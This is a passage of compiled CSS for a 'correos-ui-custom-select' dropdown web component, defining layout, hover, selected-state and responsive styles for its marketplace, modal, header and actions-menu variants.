			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select:active,
			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.sc-correos-ui-custom-select:focus {
				outline: none
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option--list-img.selected.sc-correos-ui-custom-select {
				border: 2px solid var(--_ui-custom-label-color);
				border-radius: 8px;
				background-color: transparent
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select {
				width: 100%;
				-ms-flex: 0 1 100%;
				flex: 0 1 100%
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select:hover {
				-webkit-box-shadow: 0;
				box-shadow: 0;
				color: transparent;
				border-radius: 8px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select:hover {
					-webkit-box-shadow: var(--_ui-custom-select-box-shadow);
					box-shadow: var(--_ui-custom-select-box-shadow)
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select {
					-ms-flex: 0 1 33%;
					flex: 0 1 33%;
					width: auto
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
				background: #f9f8f8;
				width: calc(100% - 1.5px);
				-ms-flex: 0 1 calc(100% - 1.5px);
				flex: 0 1 calc(100% - 1.5px);
				margin-left: 1px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
					background: transparent;
					width: auto;
					-ms-flex: 0 1 33%;
					flex: 0 1 33%
				}
			}

			.sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::before {
				left: -2px;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg)
			}

			.sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select::after {
				left: 2.5px;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg)
			}

			.sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				opacity: 1;
				visibility: visible;
				pointer-events: all;
				height: auto
			}

			.sc-correos-ui-custom-select-h .ui-text-area.sc-correos-ui-custom-select {
				padding-top: 22px
			}

			.sc-correos-ui-custom-select-h .ui-description.sc-correos-ui-custom-select {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-ui-custom-select-h .ui-description_text.sc-correos-ui-custom-select {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--_ui-radio-button-text-color);
				font-weight: 300;
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .ui-description_text.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-ui-custom-select-h .ui-text-area-dispay-none.sc-correos-ui-custom-select {
				display: none
			}

			.sc-correos-ui-custom-select-h .d-none.sc-correos-ui-custom-select {
				display: none
			}

			.sc-correos-ui-custom-select-h .section-subtitle.sc-correos-ui-custom-select {
				display: block;
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				margin: 16px 0;
				margin-left: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h .section-subtitle.sc-correos-ui-custom-select {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			[size=md].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .--list-img.sc-correos-ui-custom-select,
			[size=lg].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .--list-img.sc-correos-ui-custom-select {
				grid-row-gap: 32px;
				grid-template-columns: 33.3% 33.3% 33.3%
			}

			.sc-correos-ui-custom-select-h correos-cdk-checkbox-group.sc-correos-ui-custom-select {
				margin-left: 16px
			}

			.sc-correos-ui-custom-select-h correos-cdk-checkbox-group.sc-correos-ui-custom-select .cdk-checkbox.sc-correos-ui-custom-select {
				margin-bottom: 0px !important
			}

			.sc-correos-ui-custom-select-h correos-cdk-radio-button-group.sc-correos-ui-custom-select {
				margin-left: 16px
			}

			.sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
				display: block;
				max-height: 70vh
			}

			@media (min-width: 640px) {
				.sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: 50vh
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: 50vh
				}
			}

			[variant=marketplace].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				top: 0;
				border-radius: 8px;
				border: 1.5px solid var(--_ui-custom-label-color);
				max-width: 639px;
				width: calc(100% + 80px)
			}

			@media (min-width: 640px) {
				[variant=marketplace].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
					top: 100%;
					width: 100%;
					border: 1.5px solid var(--_ui-custom-label-color);
					border-top: 0;
					border-radius: 0 0 8px 8px;
					max-width: none
				}
			}

			[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				top: 0;
				border-radius: 8px;
				border: 1.5px solid var(--_ui-custom-label-color);
				max-width: 639px;
				width: 100%
			}

			@media (min-width: 640px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
					top: 100%;
					border: 1.5px solid var(--_ui-custom-label-color);
					border-top: 0;
					border-radius: 0 0 8px 8px;
					max-width: none
				}
			}

			@media (min-width: 640px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .selected.sc-correos-ui-custom-select {
					padding: 16px 0 16px 14px
				}
			}

			@media (min-width: 1024px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .selected.sc-correos-ui-custom-select {
					padding: 0 16px
				}
			}

			[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-figure.sc-correos-ui-custom-select {
				margin: 0;
				padding: 0;
				border: 0;
				font-size: 100%;
				font: inherit;
				vertical-align: baseline;
				width: 100%;
				height: 100%;
				overflow: hidden
			}

			@media (max-width: 639px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-figure.sc-correos-ui-custom-select {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center
				}
			}

			[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-image.sc-correos-ui-custom-select {
				width: 100%;
				height: 100%;
				-o-object-fit: contain;
				object-fit: contain;
				-o-object-position: left;
				object-position: left
			}

			@media (max-width: 639px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-image.sc-correos-ui-custom-select {
					width: 60%;
					height: 60%
				}
			}

			@media (min-width: 1024px) {
				[variant=marketplace-left].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options--list-img.sc-correos-ui-custom-select .ui-item-list.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-image.sc-correos-ui-custom-select {
					-o-object-position: center;
					object-position: center
				}
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				height: 200px;
				display: none
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				display: block;
				top: 74px;
				width: 72px;
				background: var(--_ui-custom-select-arrow-background)
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
				background: var(--_ui-custom-select-background-color)
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select {
				text-decoration: none
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-button-inner-text.sc-correos-ui-custom-select {
				text-transform: uppercase;
				-webkit-text-decoration-line: none;
				text-decoration-line: none
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select {
				border-radius: 0
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				content: " ";
				top: -16px;
				border: solid transparent;
				right: 23px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				width: 4px;
				position: absolute;
				pointer-events: none;
				border-color: var(--_ui-custom-label-color);
				border-bottom-color: var(--_ui-custom-select-background-color);
				border-width: 8px
			}

			[variant=modal].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				top: -18px;
				border-color: var(--_ui-custom-select-background-color);
				border-bottom-color: transparent;
				z-index: 2
			}

			[margin-bottom=true].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				margin-bottom: 0
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				text-transform: uppercase
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				border: none;
				background: transparent
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				color: var(--_ui-custom-label-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select {
				color: var(--_ui-custom-label-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				top: 74px;
				width: 72px;
				background: var(--_ui-custom-select-arrow-background)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
				background: var(--_ui-custom-select-background-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select {
				text-decoration: none
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-button-inner-text.sc-correos-ui-custom-select {
				text-transform: uppercase;
				-webkit-text-decoration-line: none;
				text-decoration-line: none
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color);
				background-color: var(--_ui-custom-label-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select {
				border-radius: 0
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				content: " ";
				top: -16px;
				border: solid transparent;
				right: 23px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				width: 4px;
				position: absolute;
				pointer-events: none;
				border-color: var(--_ui-custom-label-color);
				border-bottom-color: var(--_ui-custom-select-background-color);
				border-width: 8px
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				top: -18px;
				border-color: var(--_ui-custom-select-background-color);
				border-bottom-color: transparent;
				z-index: 2
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				height: 40px
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				border: none;
				background: transparent
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--theme-color-blue);
				margin-right: 8px
			}

			@media (min-width: 1024px) {
				[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select {
				color: var(--theme-color-blue)
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				text-transform: uppercase
			}

			[variant=header-band].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-link.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select {
				color: var(--theme-color-white-plain);
				background-color: var(--theme-color-blue)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				text-transform: uppercase
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				border: none;
				background: transparent
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				color: var(--_ui-custom-label-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__arrow.sc-correos-ui-custom-select {
				color: var(--_ui-custom-label-color)
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				border: 2px solid var(--_ui-custom-label-color);
				border-radius: 8px
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				text-transform: uppercase
			}

			[variant=header].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select .ui-option.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color);
				background-color: var(--_ui-custom-label-color)
			}

			[variant=header-private].sc-correos-ui-custom-select-h,
			[variant=actions-menu].sc-correos-ui-custom-select-h,
			[variant=actions-button].sc-correos-ui-custom-select-h {
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content;
				position: relative;
				text-transform: none
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				padding-right: 18px;
				padding-left: 0px
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				margin-right: 14px;
				font-size: 0.75rem;
				line-height: 1.175rem;
				font-weight: bold;
				display: none
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
					display: block
				}
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
					padding: 0px
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				display: block;
				max-width: 304px;
				top: 56px;
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select {
				max-height: 392px;
				background-color: var(--_ui-custom-select-arrow-background)
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select {
					max-height: 504px
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n),
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n),
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .sc-correos-ui-custom-select:nth-child(2n) {
				background: var(--_ui-custom-select-background-color)
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				padding: 24px;
				border: 0px;
				text-decoration: none
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:hover,
